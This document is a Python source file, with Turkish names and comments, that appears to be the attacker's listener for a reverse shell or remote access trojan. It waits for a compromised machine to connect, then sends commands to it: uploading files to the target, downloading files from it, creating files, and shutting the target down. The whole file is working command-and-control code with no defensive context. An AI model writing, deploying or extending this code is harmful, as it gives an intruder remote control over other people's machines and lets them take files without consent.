import socket
import simplejson
import base64

class Baglama:
    def __init__(self,ip,port):

        self.baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.baglanti.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        self.baglanti.bind((ip,port))
        self.baglanti.listen(5)
        print("Dinlemeye Başladı ")

        self.baglan,adres = self.baglanti.accept()
        print("Bağlandı" + str(adres))

    def paketleme(self,veri):
        paket = simplejson.dumps(veri)
        self.baglan.sendall(paket.encode("utf-8"))
        if veri[0] == "çıkış":
            self.baglanti.close()
            self.baglan.close()
            exit()

    def paketCoz(self):
        gelenVeri = ""
        while True:
            try:
                gelenVeri = gelenVeri + self.baglan.recv(1024).decode("utf-8")
                return simplejson.loads(gelenVeri)
            
            except ValueError:
                continue

    def oluştur(self, dosyaAdi, icerik):
        with open(dosyaAdi, "w") as dosya:
            dosya.write(icerik)
        return dosyaAdi + " Oluşturuldu."
    
    def baslatma(self):
        while True:
            giris = input("Komut gir: ")
            giris = giris.split(" ")#Eğer içine boşluk yazılırsa böl
            try:
                if giris[0] == "yükle":
                    with open(giris[1],"rb") as dosya:
                        veri = base64.b64encode(dosya.read())
                        giris.append(veri)
                self.paketleme(giris)
                cikti = self.paketCoz()

                if giris[0] == "oluştur" and "Hata" not in cikti:
                    cikti = giris[1] + " Oluşturuldu"

                #İndirme İşlemei
                if giris[0] == "indir" and "Hata" not in cikti:
                    with open(giris[1], "wb") as dosya: #wb yazma işlemine yarıyor
                        dosya.write(base64.b64decode(cikti))
                        
                    cikti = giris[1] + " İndirme işlemi başarıyla gerçekleşti"

                if giris[0] == "kapat":
                    print("Hedef sistem kapatılıyor...")
                    break

            except Exception:
                cikti = "Hata"
            print(cikti)

baglantiKurma = Baglama("127.0.0.1",888)
baglantiKurma.baslatma()